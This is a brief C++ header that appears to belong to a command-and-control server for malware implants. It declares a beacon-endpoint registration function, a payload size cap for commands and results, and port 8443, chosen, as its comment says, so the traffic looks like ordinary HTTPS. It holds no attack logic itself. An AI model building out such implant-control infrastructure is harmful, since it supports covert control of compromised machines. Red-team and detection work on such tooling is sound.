#pragma once

#include <httplib.h>

#include <cstddef>
#include <cstdint>

#include "sessionStore.hpp"

// Alternate HTTPS port: looks like ordinary HTTPS traffic and doesn't collide
// with 443.
inline constexpr std::uint16_t kPort = 8443;

// Sanity cap on a single command or result payload (1 MiB).
inline constexpr std::size_t kMaxPayload = 1u << 20;

// Register the implant-facing endpoints. The store outlives the server, so it
// is borrowed rather than owned here.
void register_all_beacon_endpoints(httplib::SSLServer &server,
                                   SessionStore &store);
